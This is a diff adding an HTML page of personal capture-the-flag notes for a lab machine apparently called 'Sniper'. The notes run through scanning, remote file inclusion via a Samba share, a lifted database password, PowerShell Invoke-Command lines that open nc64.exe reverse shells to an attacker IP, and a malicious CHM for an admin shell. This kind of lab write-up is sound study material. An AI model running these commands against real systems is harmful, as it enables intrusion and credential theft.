@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Markdown Converted HTML</title>
+    <link rel="stylesheet" type="text/css" href="../../style.css">
+    
+</head>
+<body>
+<p><strong>NMAP:</strong><br />
+PORT    STATE SERVICE<br />
+80/tcp  open  http<br />
+135/tcp open  msrpc<br />
+139/tcp open  netbios-ssn<br />
+445/tcp open  microsoft-ds</p>
+
+<p>Can’t look at share<br />
+rpcclient needs creds<br />
+Dirbuster, got bunch of dir’s. Grep them for user and pass and whatsoever, nothing.</p>
+
+<p>Web testing needed</p>
+
+<p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a><br />
+<a href="https://techno4you.net/2018/09/18/how-to-configure-samba-server-in-kali-linux/">https://techno4you.net/2018/09/18/how-to-configure-samba-server-in-kali-linux/</a><br />
+<a href="https://techno4you.net/2018/09/18/how-to-configure-samba-server-in-kali-linux/">https://websiteforstudents.com/create-public-samba-share-ubuntu-17-04-17-10/</a><br />
+<a href="https://techno4you.net/2018/09/18/how-to-configure-samba-server-in-kali-linux/">http://10.10.10.151/blog/?lang=\\10.10.14.2\Public\mannu.php</a>#</p>
+
+<p>Made share put mannu.php in it, used RFI to open it, i can now execute commands and look at files.</p>
+
+<p>SO, I used a php script to get a rev shell</p>
+
+<p>With that rev shell I found a file (db.php) which had:<br />
+<strong>$con \= mysqli_connect("localhost","dbuser","36mEAhz/B8xQ\~2VM","sniper");</strong><br />
+In it. I tested the creds with smbclient and the users i found in C:/Users<br />
+They are the pass is <strong>Chris’s password.</strong></p>
+
+<p>I did the command whoami /priv so see if i had any privs<br />
+<strong>Privilege Name        Description                             State</strong><br />
+<strong>\======================= \========================================= \=======</strong><br />
+<strong>SeChangeNotifyPrivilege Bypass traverse checking                  Enabled</strong><br />
+<strong>SeImpersonatePrivilege  Impersonate a client after authentication Enabled</strong><br />
+<strong>SeCreateGlobalPrivilege Create global objects                     Enabled</strong></p>
+
+<p>I can impersonate people. I try runas but can’t supply a password.<br />
+<strong>Invoke-Command -Computer Sniper -ScriptBlock{ type C:\Users\Chris\Desktop\user.txt } -Credential $cred</strong><br />
+find ipsec used it in a video<br />
+<a href="https://www.youtube.com/watch?v=krC5j1Ab44I">https://www.youtube.com/watch?v=krC5j1Ab44I</a><br />
+<strong>$pass \= convertTo-SecureString '36mEAhz/B8xQ\~2VM' -AsPlainText -Force</strong><br />
+<strong>$cred \= New-Object System.Management.Automation.PSCredential("Sniper\Chris",$pass)</strong><br />
+<strong>Invoke-Command -Computer Sniper -ScriptBlock{ type C:\Users\Chris\Desktop\user.txt } -Credential $cred</strong></p>
+
+<p><strong>FLAG \=>> 21f4d0f29fc4dd867500c1ad716cf56e</strong></p>
+
+<p><strong>_____________________________</strong></p>
+
+<p><strong>Invoke-Command -Computer Sniper -ScriptBlock{ \\10.10.14.2\Public\nc64.exe 10.10.14.2 1337 -e cmd.exe } -Credential $cred</strong></p>
+
+<p>For Chris shell </p>
+
+<p><a href="https://helpcreator.net/en/index.php/2019/07/28/decompile-extract-chm-files/">https://helpcreator.net/en/index.php/2019/07/28/decompile-extract-chm-files/</a></p>
+
+<p>$pass \= convertTo-SecureString '36mEAhz/B8xQ\~2VM' -AsPlainText -Force<br />
+<strong>$cred \= New-Object System.Management.Automation.PSCredential("Sniper\Chris",$pass)</strong><br />
+<strong>Invoke-Command -Computer Sniper -ScriptBlock{ \\10.10.14.4\Public\nc64.exe 10.10.14.4 1338 -e cmd.exe } -Credential $cred</strong></p>
+
+<p>Found files in the downloads folder, did this to look at it<br />
+Hh.exe -decompile help instructions.chm<br />
+Found docs in C:/Docs<br />
+Have write perms in here</p>
+
+<p>Have write perms in C:\microsoft</p>
+
+<p>Used this to transfer files from my python http server<br />
+<strong>Start-BitsTransfer -Source $url -Destination $output</strong></p>
+
+<p>This makes exploit chm files. nishang<br />
+<strong>Out-chm.ps1</strong></p>
+
+<p>Run that, pop it in C:\Docs with nc64 in the microsoft folder. Pops a adminshell<br />
+<strong>5624caf363e2750e994f6be0b7436c15</strong></p>
+
+</body>
+</html>
